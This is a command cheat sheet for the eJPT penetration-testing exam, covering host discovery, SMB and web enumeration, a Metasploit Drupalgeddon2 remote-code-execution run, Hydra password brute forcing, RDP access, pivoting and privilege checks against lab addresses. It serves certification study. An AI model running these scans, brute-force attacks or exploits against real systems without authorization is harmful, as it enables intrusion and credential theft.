Cheat Sheet

This cheat sheet is a list of commands to help with the eJPT.

*** FOR A DEEP DIVE REFER TO: ***

----------------------------------------------------------------------------------------------------------------------

Phase 1: Deep Discovery & Network Mapping
  
#Identify live hosts using ARP discovery
netdiscover -r 10.11.12.0/24 

#Find live hosts using fping
fping -a -g 10.11.12.0/24 2>/dev/null | tee scans.txt

#Comprehensive Nmap scan for all ports, OS, and service versions
nmap -sV -sC -O -A -p- -T4 10.11.12.13 

#Identify the total number of Windows server xxxx instances in the subnet
grep -i "windows server xxxx" full_scan.txt 

# It's important to add virtual hosts at times to access the page 
sudo nano /etc/hosts
<Add the name and the IP>
<Ctrl + S>
---------------------------------------------------------------------------------------------
Phase 2: SMB & RPC Enumeration (The Windows Entryway)
  
#Windows Shares Enumeration
smbclient -L //10.11.12.13
enum4linux -a 10.11.12.13

#List all available shares anonymously (Null Session)
smbclient -L //10.11.12.13 -N 

#Map shares and permissions for a specific user
smbmap -H 10.11.12.13 -u user -p "" 

#Comprehensive Windows/Samba enumeration (Users, Shares, OS details)
enum4linux -a 10.11.12.13 

#Connect to a specific SMB share as a valid user
smbclient //10.11.12.13/Users -U user 
---------------------------------------------------------------------------------------------
Phase 3: Web Application & CMS Exploitation (WordPress/Drupal)

#Inspect headers for WordPress locations and redirects
curl -I http://10.11.12.13/wp-login.php 

#Enumerate WordPress users and vulnerable plugins
wpscan --url http://wordpress.local --enumerate u,vp 

#Brute force WordPress login via XML-RPC
wpscan --url http://wordpress.local/ -U user -P /usr/share/wordlists/rockyou.txt 

#Identify Drupal version from the CHANGELOG
curl http://10.11.12.13/drupal/CHANGELOG.txt 

METASPLOIT

#Usage of Metasploit
msfconsole 
search <vulnerability name >
use <number associated with the desired exploit>
show options 
set RHOSTS <target IP>
set LHOST <our IP>
run 

#Example Exploit Drupalgeddon2 (CVE-2018-7600) for unauthenticated RCE
use exploit/unix/webapp/drupal_drupalgeddon2 
set RHOSTS 10.11.12.13 
set LHOST tun0 <##For my fellow newbies tun0 is your IP##>
set TARGETURI /drupal/ 
run 

#Test for WebDAV functionality and allowed methods
curl -X OPTIONS http://10.11.12.13 
---------------------------------------------------------------------------------------------
Phase 4: Password Cracking & Brute Force (Hydra)

#Brute force FTP for the 'admin' user
hydra -l user -P /usr/share/wordlists/rockyou.txt 10.11.12.13 ftp

#Brute force SMB for the 'admin' user
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.12.13 smb 

#Brute force SSH access for the 'admin' account
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.12.13 ssh 
---------------------------------------------------------------------------------------------
Phase 5: Gaining Remote Access (RDP)

#Connect to a Windows target via RDP with specific user credentials
xfreerdp /u:admin /p:xyz /v:10.11.12.13 /cert-ignore 

#Connect with dynamic resolution and clipboard enabled
xfreerdp /v:10.11.12.13 /u:admin /p:xyz /dynamic-resolution +clipboard /cert-ignore 

SQL:

#Login to MySQL with password
mysql --user=root --port=13306 -p -h 172.16.64.81

#Commands once inside the Database 
> SHOW databases;
> use <name of the database>
> SHOW tables FROM <name of the database>;
> SELECT * FROM <table_name>;
---------------------------------------------------------------------------------------------
Phase 6: Pivoting & Internal Enumeration

#Check local routing table for internal network interfaces
ip route 
route 

#Windows
route print

#Checking the ports operating currently 
# Linux
netstat -tunp
netstat -tulpn

# Windows
netstat -ano

#Add a network to current route
ip route add 10.10.10.0/24 via 8.8.8.8

#View Windows interface configurations for secondary networks
ipconfig /all 

#Add an internal route through a Meterpreter session
route add 172.16.1.0 255.255.255.0 1 
---------------------------------------------------------------------------------------------
Phase 7: Post-Exploitation & Privilege Escalation
  
#List current user privileges 
whoami /priv 

#List members of the local Administrators group
net localgroup administrators 

#Read Linux password encryption settings to identify the hashing algorithm (e.g., SHA-512)
grep "ENCRYPT_METHOD" /etc/login.defs 

#Locate flags in user directories
dir C:\Users\abc\xyz\flag.txt 
---------------------------------------------------------------------------------------




  
